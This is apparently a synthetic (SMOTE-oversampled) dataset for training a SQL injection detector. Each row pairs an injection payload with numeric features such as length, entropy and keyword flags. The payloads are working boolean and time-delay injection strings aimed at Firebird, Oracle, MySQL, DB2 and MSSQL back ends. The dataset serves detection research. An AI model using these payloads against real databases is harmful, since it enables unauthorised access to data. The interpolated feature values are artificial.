id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000370,attack,boolean,-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R000775,1.1222565217856577,124.61403113561514,34.70864619310162,4.324749038662213,53.1810769885027,19.889723181604325,34.598369374705946,16.944861590802162,0.42880412500530135,0.15857527135989308,0.2766983161060841,0.13592228752872143,4.763784602299459,0.23621539770054045,1.4724307954010811,0.0,0.0,1.2362153977005406,0.0,4.236215397700541,0.0,0.0,0.0,6.708646193101622,1.0,0.23621539770054054,0.23621539770054045,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.23621539770054056,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.236215397700541
SMOTE_000371,attack,boolean,"-1072%""   )    )    or 3090  =  3539",nearest_attack_euclidean,R000350,0.17685211477100163,35.89673483699413,15.103265163005865,3.0225825896536263,2.0,12.0,16.0,5.896734836994137,0.05571946851270776,0.33431681107624633,0.44575574810166174,0.16420797230938416,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.8967348369941348,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000372,attack,boolean,"-6971"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""ifuh"" like ""ifuh",nearest_attack_euclidean,R000419,0.21929965591949568,361.7106732114455,38.0,3.738298512094421,104.78300490858416,47.78300490858416,148.14466339427725,61.0,0.2896835325913275,0.1320977149198901,0.4095742809456651,0.16864447154311726,0.0,3.9999999999999996,0.9276683028613854,0.0,0.0,2.0723316971386145,0.0,30.0,0.0,3.0,0.0,23.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0723316971386145,0.9276683028613854,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000373,attack,boolean,"1"" where 4082  =  4082 and elt  (  5699  =  1432,1432  )  --",nearest_attack_euclidean,R000459,0.42630716316846834,65.5777663122183,26.2395036249374,3.874636245741081,14.098759062343504,21.0,21.8592554374061,8.619751812468701,0.20995087912525826,0.3249715614195332,0.3333333333333333,0.1317442261218751,0.0,1.0,2.0,0.0,0.0,2.0,0.0,2.3098759062343497,0.0,0.30987590623435,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000374,attack,boolean,"1   )    )    as rual where 4649  =  4649 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000265,0.31878779803692936,283.40260050256336,34.080520100512665,3.7521400594737475,60.32208040205065,79.0,111.91947989948733,32.16104020102533,0.21283609054312103,0.27876171182147497,0.39492689383671753,0.11347530379868645,0.16104020102532668,0.0,1.8389597989746733,0.0,2.0,2.0,0.0,20.0,0.0,0.0,6.0,6.0,0.08052010051266334,0.0,0.9194798994873365,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.080520100512663,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,8.080520100512663
SMOTE_000375,attack,boolean,‘ or 3  =  3 --,nearest_attack_euclidean,R000022,0.05855425428052957,14.972263119889547,6.986131559944766,2.3295377582916377,2.0,2.0,6.972263119889533,4.0,0.13361781415497914,0.13361781415497917,0.4655287433800833,0.26723562830995834,0.0416053201657034,0.0,1.9722631198895313,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.972263119889531,0.013868440055234466,0.0,0.9861315599447655,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000376,attack,boolean,"1""   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""vcjt"" like ""vcjt",nearest_attack_euclidean,R000130,1.0636968334125296,279.4515465272779,37.096906945444175,3.7169024515426554,86.54845347272209,27.903093054555825,118.0,47.0,0.30971241642365954,0.09984346141813329,0.42225700857374815,0.168187113584459,0.0,3.9999999999999996,0.0,0.0,0.0,1.0,0.0,26.0,0.0,2.0,4.0,11.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.5484534727220867,0.4515465272779134,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,9.0
SMOTE_000377,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000010,2.2318499442329305,52.491880626311826,17.465223222455435,3.0035645542003726,9.598917416841573,6.331529028069292,25.26197547298016,11.299458708420788,0.19243244381180624,0.10099327765099575,0.4626102804351126,0.2439639981020854,0.0,4.566847097193071,1.5668470971930706,0.0,0.0,1.4331529028069294,0.0,3.732611611227717,0.0,0.0,0.0,3.0,0.0,1.0,0.5668470971930706,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.4331529028069293,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.4331529028069294
SMOTE_000378,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000234,0.06034312740479187,250.4943609544551,37.0,3.759087350330332,74.0,29.0,101.24530079537924,46.249060159075846,0.29556198845742415,0.11582834682790949,0.4039696338850482,0.18464003082961813,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.249060159075846,1.9999999999999998,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,9.0
SMOTE_000379,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",nearest_attack_euclidean,R000282,0.28187608156796173,135.0,30.420840782725676,4.114082200264623,80.0,3.7104203913628364,35.579159217274324,15.710420391362838,0.5925925925925926,0.027484595491576558,0.26354932753536536,0.11637348438046546,3.0,0.0,0.0,0.0,1.0,1.0,0.0,4.289579608637162,0.0,0.0,2.710420391362838,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000380,attack,boolean,"1   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000517,1.0965976279769494,166.39697675772166,28.343912688461025,3.628099651045258,93.86784170771497,10.624349246155907,46.24869849231181,15.656087311538975,0.5577706131134168,0.06365613231192542,0.2821457888822887,0.09642746569236905,0.0,0.0,2.0,0.0,1.0,1.0,0.0,6.0,0.0,0.0,4.624349246155907,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000381,attack,boolean," select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",nearest_attack_euclidean,R000025,0.0,63.0,22.0,3.48889649539661,26.0,4.0,24.0,9.0,0.4126984126984127,0.06349206349206349,0.38095238095238093,0.14285714285714285,0.0,2.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,5.0
SMOTE_000382,attack,boolean,"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000484,0.8197424600880987,73.20060015562193,23.82564683831058,3.281264091258592,8.753280874241561,14.144731928138036,35.01312349696625,15.289463856276072,0.11604264938278191,0.20625875672876373,0.46417059753112755,0.21352799635732683,4.0,0.0,1.0,0.0,0.0,2.0,0.0,5.217097892207054,1.9999999999999998,0.536182982034509,0.536182982034509,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000383,attack,boolean,-9120'   )    )    or 8571  =  8571--,nearest_attack_euclidean,R000528,0.7067404527323395,33.875666234029296,14.0,3.1297201313395817,2.0,12.0,13.321999629167962,6.553666604861327,0.05968348426301029,0.3581009055780618,0.3882011950763477,0.19401441508258027,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.553666604861327,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000384,attack,boolean,"1%'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  '%'  =  '",nearest_attack_euclidean,R000417,0.9433113453746115,275.58708742963915,32.0,3.6430529733042403,51.62664837262439,71.0,115.46703254751228,37.49340650950245,0.18770226745640547,0.2580436109065688,0.41826543003725625,0.13598869159976942,4.0,0.0,0.0,0.0,2.0,2.0,0.0,21.493406509502456,1.9999999999999998,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.6266483726243863,0.3733516273756138,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,8.0
SMOTE_000385,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000177,0.09921821007515072,136.96202356239078,30.113929312827675,3.917298180596273,71.03797643760923,8.037976437609224,40.848094249563104,17.037976437609224,0.5186721285435122,0.058689704994275296,0.2982366866751891,0.12440147978702343,0.0,1.0,2.0,0.0,1.0,1.0,0.0,5.962023562390775,1.0,0.0,2.037976437609225,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.037976437609224756,0.9620235623907754,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000386,attack,boolean,"1""   )    )    as uels where 9447  =  9447 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000630,0.8379232090612749,175.06108607631376,35.37804352017554,3.8287266055284825,50.109782399122324,27.420760639034558,68.97565183859572,28.554891199561162,0.28679235363928435,0.1554314075796438,0.3941583783880545,0.16361786039301732,0.0,1.0,2.0,0.0,0.0,2.0,0.0,13.554891199561162,0.0,1.6890217600877673,1.6219564798244652,10.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5548911995611632,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.5548911995611627
SMOTE_000387,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000605,1.2676766402563846,150.9874063766373,29.40251872467254,3.884971014524609,72.31133426102642,8.597481275327462,48.286147014301044,21.792443825982385,0.4801583130509799,0.05681354677280902,0.3191035097146714,0.1439246304615398,0.0,3.9999999999999996,0.0,0.0,1.0,2.0,0.0,6.597481275327462,1.9999999999999998,1.4937031883186553,2.597481275327462,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000388,attack,boolean,"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000577,0.8388748730773178,164.23125910208236,30.0,3.7659962795873536,74.68925036408329,8.0,58.785007281665884,22.757001456333178,0.45697700640587524,0.048969701280783956,0.3555999608768858,0.13845333143645508,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.757001456333176,1.9999999999999998,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.6892503640832945,0.31074963591670557,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000389,attack,boolean,"1'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000404,1.0737660043936075,181.38413446036017,28.0,3.4880191426969303,108.34059063719431,12.0,45.04354382316587,16.0,0.597449366322427,0.06617980376271033,0.2481310915645823,0.08823973835028046,0.6594093628056888,0.0,2.0,0.0,1.0,1.0,0.0,5.34059063719431,0.0,0.0,6.0,4.0,0.6594093628056887,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.34059063719431126,0.6594093628056887,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000390,attack,boolean,1   )    )     )   rlike   (  select   (  case when   (  4367  =  6879  )   then 1 else 0x28 end   )    )    and    (    (     (  2542  =  2542,nearest_attack_euclidean,R000120,1.8035442169278244,133.81495193168158,27.54074759658408,3.303182764013322,37.67401922732737,17.325980772672626,64.81495193168156,14.0,0.2853872524777214,0.1279493581173957,0.48145043398067133,0.10521295542421161,0.0,1.8370096136636866,0.0,0.0,0.0,2.0,0.0,10.162990386336313,0.0,0.0,0.0,2.0,0.0,0.4592524034159217,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000391,attack,boolean,-3044'  )   or 4999  =  3051#,nearest_attack_euclidean,R000208,0.6805989373814212,28.693364990268435,14.0,3.2436337126950154,2.0,12.0,10.0,4.693364990268439,0.06972077588603837,0.4183246553162299,0.34860387943019167,0.16335068936754008,0.6933649902684393,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.6933649902684393,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000392,attack,boolean,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",nearest_attack_euclidean,R000136,0.4578218018191696,225.71548647389244,29.14278209538172,3.498261877533611,118.85774323694623,12.0,71.85774323694623,23.0,0.52659936861049,0.05319873722098002,0.31823764782831826,0.1019642463402117,4.0,0.0,0.0,0.0,1.0,2.0,0.0,9.714435809236559,0.28556419076344136,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000393,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R000600,0.9246303764308323,23.44373844157562,10.194532694803048,3.033412930010904,12.638271136378677,0.3890653896060918,6.805467305196963,3.6109346103939046,0.531163388770372,0.022886199388593736,0.29418944362092814,0.15176096822010626,0.19453269480304702,2.416401915590859,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.1945326948030469,0.8054673051969532,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.8054673051969531,0.19453269480304697,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000394,attack,boolean,"1"" where 4978  =  4978 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000377,0.3094027667232469,203.59334464933949,33.14066553506605,3.724218432556464,116.57800339480184,20.0,50.156006789603694,16.859334464933948,0.5732395795339692,0.09846471334557448,0.24552703195593184,0.08276867516452446,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.859334464933949,0.0,0.0,6.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000395,attack,boolean,"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000484,0.18953138576070389,82.24532610804654,26.420068654325586,3.3939846777467877,11.42006865432559,16.0,38.26020596297676,16.56505149074419,0.1382819825884343,0.1960917615456783,0.4638688881517225,0.2017573677141649,4.0,0.0,1.0,0.0,0.0,2.0,0.0,5.710034327162793,1.9999999999999998,0.8550171635813967,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000396,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000159,0.7264634507982759,101.57751748115393,29.310069924615703,3.47318081486044,22.310069924615703,16.0,46.84496503769215,16.422482518846074,0.21954637087585976,0.15751890121350584,0.4612328314610288,0.1617018964496056,4.0,0.0,1.0,0.0,0.0,1.4224825188460746,0.0,8.0,0.0,1.0,1.0,2.422482518846075,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000397,attack,boolean,"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh",nearest_attack_euclidean,R000744,1.0825140889538631,202.84136136194644,34.358997353557974,3.774906164685568,64.33858570921306,27.54359894142319,79.15398412134785,31.805192589962328,0.3160007596301879,0.13822920614557482,0.38975927334162525,0.15601076088261198,0.27179947071159494,0.0,0.0,0.0,0.0,1.0,0.0,17.902596294981166,0.0,1.271799470711595,3.2717994707115947,8.087197882846379,0.27179947071159494,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.7282005292884051,0.2717994707115949,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.54359894142319,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,6.543598941423189
